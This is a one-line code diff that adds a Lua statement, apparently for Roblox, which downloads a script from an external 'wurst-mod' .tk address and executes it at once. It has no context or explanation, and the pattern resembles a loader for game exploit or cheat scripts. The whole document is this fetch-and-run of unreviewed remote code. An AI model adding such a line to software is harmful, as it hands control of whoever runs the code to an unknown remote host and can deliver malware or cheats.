@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.wurst-mod.tk/main/latest.lua"))
